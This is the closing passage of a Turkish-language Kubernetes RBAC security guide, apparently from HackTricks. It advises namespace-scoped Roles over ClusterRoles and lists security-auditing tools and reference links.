- **Roller vs. ClusterRoller**: Namespace'e özgü izinler için ClusterRoller ve ClusterRoleBindings yerine Roller ve RoleBindings kullanmayı tercih edin. Bu yaklaşım, daha ince kontrol sağlar ve izinlerin kapsamını sınırlar.

### **Otomatik Araçlar Kullanın**

{{#ref}}
https://github.com/cyberark/KubiScan
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-hunter
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-bench
{{#endref}}

## **Referanslar**

- [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
- [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{{#include ../../../banners/hacktricks-training.md}}
